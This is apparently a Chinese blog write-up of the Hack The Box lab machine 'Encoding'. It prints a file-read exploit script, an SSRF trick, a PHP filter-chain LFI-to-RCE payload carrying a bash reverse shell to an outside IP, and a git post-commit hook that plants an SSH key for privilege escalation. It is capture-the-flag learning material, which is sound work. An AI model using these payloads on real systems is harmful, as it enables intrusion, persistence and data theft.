---
title: ' HTB：Encoding'
date: 2023-04-23 18:14:17
tags: [HTB,靶场,刷题]
published: true
hideInList: false
feature: 
isTop: false
---


标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service

………慢慢来，不要着急。打退役box积攒经验中…

## Recon

探索了下页面，又看了下标题其实感觉主要是页面内提供Encoding功能的API，不过这个只是猜测

**端口扫描**

端口扫描没收获也大概证实了一下这个猜想（？ 只有 `80`, `22`

**目录爆破**

用feroxbuster

```json
[####################] - 10m    60021/60021   0s      found:8       errors:633    
[####################] - 10m    30000/30000   47/s    http://10.10.11.198/ 
[####################] - 7m     30000/30000   64/s    http://10.10.11.198/includes/ 
[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/js/ => Directory listing
[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/ => Directory listing
[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/img/ => Directory listing
[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/css/ => Directory listing
```

**子域名扫描**

`wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u [http://haxtables.htb](http://haxtables.htb/) -H "Host:FUZZ.haxtables.htb" --hc 302,400,404 --hw 137`

这里前期发现会有误报，所以需要加一个 `--hw 137`的选项

```php
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                     
=====================================================================

000000051:   200        0 L      0 W        0 Ch        "api"                                                                                                                                                                                       
000000177:   403        9 L      28 W       284 Ch      "image"
```

**网站探索**

页面探索了以下，功能点的路径如下，(请求体下的 `uri_path` 为对应的api地址，感觉后续可以利用)：

```bash
http://10.10.11.198/handler.php
```

然后是涉及api的子域名（相关介绍在http://10.10.11.198/index.php?page=api）：

```bash
http://api.haxtables.htb/
```

记得将上述提到的域名添加到hosts文件中

## API

### 文档阅读

文档里写的是 `POST` 请求：

- string类型：`http://api.haxtables.htb/v3/tools/string/index.php`
- int类型： `http://api.haxtables.htb/v3/tools/integer/index.php`

此外，string和int除了支持json构造请求体（如下）：

```json
json_data = {
        'action': 'dec2bin,
        'data': 'str or int',
    }
```

还支持指定本地文件or文件url的形式对文件进行转换

文件上传的功能测试

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423.png)

### 目录爆破

`feroxbuster -u [http://api.haxtables.htb](http://api.haxtables.htb/) -x php -m GET,POST` 

```json
[####################] - 30m   420066/420066  0s      found:45      errors:20056  
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/ 
[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v2/ => Directory listing
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/ 
[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v3/ => Directory listing
[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v3/tools/ => Directory listing
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/integer/ 
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/string/ 
[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v1/ => Directory listing
[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v1/tools/ => Directory listing
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/string/ 
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/integer/ 
[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/string/
```

除了版本不同，功能点是一样得差不多

## source-code & git

### 源代码阅读

尝试指定文件路径进行encoding的功能点，构造对应的exp：

```python
import requests

def get_file(file):
    data = {
        'action': 'str2hex',
        'file_url': f"file://{file}"
    }
    http_proxy = {'http': 'http://127.0.0.1:8080'}
    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data,proxies=http_proxy)
    return response.json()["data"]

def hex2str(data):
    json_data = {
    'action': 'hex2str',
    'data': f'{data}',
    }
    http_proxy = {'http': 'http://127.0.0.1:8080'}
    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data,proxies=http_proxy)
    print(response.json()["data"])

file = "/etc/passwd"    # 改成对应地址
data = get_file(file)
hex2str(data)
```

可以获取到

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_1.png)

稍微改写了一下，遍历然后输出

```python
files = ["/etc/passwd", "/var/www/html/index.php","/var/www/html/handler.php"]
for file in files:
    data = get_file(file)
    file_content = hex2str(data)
    file_name = file.split('/')[-1]
    print(file_name)
    with open(f'{file_name}', 'a') as f:
        f.write(file_content)
```

然后看 `handler.php` 下的内容

```python
<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];

    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);

    }

}

$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;

?>
```

提取 `../api/utils.php` 的内容,

```php
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_included_contents($filename) {
    ob_start();
    include $filename;
    return ob_get_clean();
}

function get_url_content($url){
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
	jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;
}

function make_api_call($action, $data, $uri_path, $is_file = false){
    if ($is_file) {
        $post = [
            'data' => file_get_contents($data),
            'action' => $action,
            'uri_path' => $uri_path
        ];
    } else {
        $post = [
            'data' => $data,
            'action' => $action,
            'uri_path' => $uri_path
        ];
    }
    
    $ch = curl_init();
    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
    
    
}

?>
```

在这里 `gethostbyname($domain) === "127.0.0.1"` 用于判断给出的 `$domain` 是否指向本地

访问 `image.haxtables.htb` 是403,然后试着用刚刚写的那个py去看下 `/var/www/image/index.php` 

```php
<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>
```

看了一下comming_soon.html也没什么东西，但是 `utils.php` 里看到了关键得内容

```php
function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
```

### .git

在 `[git-commit.sh](http://git-commit.sh)` 下看到了 `/var/www/image/.git`

这里用git-dumper有点麻烦是，得本地提供一个服务去获取远程主机的。这里我用FastAPI～ 起到一个反向代理的作用。参考了：[https://github.com/tiangolo/fastapi/issues/1788](https://github.com/tiangolo/fastapi/issues/1788) 下的方案写出的。本来以为FastAPI对于写API来说会比较方便，实现了这个却发现或许Flask会好点。

这里新建了一个proxy.py

```python
import requests
from fastapi import FastAPI, Response, Request
from requests import get
import httpx
import json
import binascii

app = FastAPI()

@app.get('/{path:path}')
async def get_file(request: Request, response: Response):
    path = request.url.path[1:]
    print(path)
    send_uri = 'http://api.haxtables.htb/v3/tools/string/index.php'
    data = {
        'action': 'str2hex',
        'file_url': f"file:///{path}"
    }
    async with httpx.AsyncClient() as client:
        proxy = await client.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data)
    body = binascii.unhexlify(json.loads(proxy.content)['data'])
    response.body = body
    response.status_code = proxy.status_code
    return response
```

然后用 `uvicorn` 命令 `uvicorn proxy:app --reload` 此时反向代理的服务提供在8000

然后使用 `git-dumper` 去获取对应的git仓库的内容：

`git-dumper [http://127.0.0.1:8000/var/www/image/.git](http://127.0.0.1:8000/var/www/image/.git) git-dumper/`

探索目录，目前为止发现比较有用的就是 `action_handler.php` 下的内容：

```python
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

访问对应的url地址： `http://image.haxtables.htb/actions/action_handler.php` 发现是403

## URI

### 构造 handler.php请求

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_2.png)

根据URI的结构，刚刚`../api/utils.php` 的代码下的函数 `make_api_call` 的内容：

```python
 $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
```

可以通过构造 `$uri_path` 的格式为 `@<ip>#` 来使服务器请求发送至 `<ip>` 而不是前者 

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_3.png)

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_4.png)

### 构造poc

用 https://github.com/synacktiv/php_filter_chain_generator 来构造..（备注：留坑，自己完了康康代码实现吧）

```python
python php_filter_chain_generator.py  --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.37/2333 0>&1 \""); ?>'
```

然后在 [`http://10.10.11.198/handler.php`](http://10.10.11.198/handler.php) 上发起请求，其中 `@image.haxtables.htb/actions/action_handler.php?page=` page后参数为生成的poc，这里是任意文件包含的入口点

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_5.png)

## shell as www-data

nc连上后还是按照惯例进行upgrade shell

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_6.png)

然后 `sudo -l` 查看权限

```python
www-data@encoding:~$ sudo -l 
sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
```

### git-commit.sh

看 `[git-commit.sh](http://git-commit.sh)` 的内容

```python
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

阅读这段代码，第一行前面是指定各种路径的参数。参考[https://git-scm.com/docs/git-ls-files](https://git-scm.com/docs/git-ls-files)， `ls-files -o` 则是列出untracked的路径和文件列表。整体阅读，即新变动的代码会自动add，否则commit

看对应的 `/var/www/image` 目录：

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_7.png)

这里 `x+` 表示有扩展属性。用getfacl命令查看：

```python
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x
```

但除了 `.git` 目录外，就没有其他可写入的地方了，但git-commit.sh 却支持我们add以及commit.这里试图用git来做一些绕过。这里有两种方法，一种是hook的方法([https://git-scm.com/book/zh/v2/自定义-Git-Git-钩子](https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90))， 一种是attribute的方法（[https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes) 用了filter指定可执行文件）。这里我先用hook的方法。

## User Flag：post-commit hook

这里我们用post-commit

![20230423](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_8.png)

1. 在 `/tmp` 目录下用ssh-keygen新生成一对 `ssh-keygen -t ed25519 -f htb  -C "me@htb"`
2. 新增一个hook（记得给post-commit修改对应权限 `chmod +x .git/hooks/post-commit`）

```python
echo -e 'mkdir -p /home/svc/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLhHmaOAjmhtwqsT4hfOlcO1WiZFYbyoAAxsYb+EzkV me@htb" >> /home/svc/.ssh/authorized_keys\nchmod 600 /home/svc/.ssh/authorized_keys' | tee .git/hooks/post-commit
```

1. 制造触发post-commit条件：创建一个文件变动。这里用： `git --work-tree /tm个p/ add /tmp/qwe`
2. 用svc用户身份执行命令，触发post-commit： `sudo -u svc /var/www/image/scripts/git-commit.sh`
3. `ssh -i /tmp/htb svc@haxtables.htb`  拿到user flag

## Root Flag

查看已有权限：

```python
svc@encoding:~$ sudo -l
sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart 
```

参考[https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) 写对应的service

先确认能否在 `/etc/systemd/system` 下写服务，用 `getfacl` 命令确认只有写执行。然后写个service，用root身份执行就是。

## Reference：

- [https://github.com/tiangolo/fastapi/issues/1788](https://github.com/tiangolo/fastapi/issues/1788)
- [https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb](https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#ssrf-in-haxtableshtb)
- [https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)